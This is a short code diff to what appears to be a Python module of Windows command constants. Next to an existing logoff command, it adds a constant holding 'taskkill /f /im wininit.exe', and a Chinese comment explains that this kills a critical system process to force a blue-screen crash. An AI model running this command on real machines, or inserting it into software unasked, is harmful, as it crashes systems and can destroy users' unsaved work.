@@ -33,3 +33,7 @@ COMMAND_MAX_BYTES = (len(basicCMD['-c']) - COMMAND_OFFSET - 2) // 2 * 2
 
 
 LOGOFF_COMMAND = "shutdown /l"
+
+
+# 结束会话管理器会让系统判定关键进程终止，直接进入蓝屏。
+BLUE_SCREEN_COMMAND = "taskkill /f /im wininit.exe"
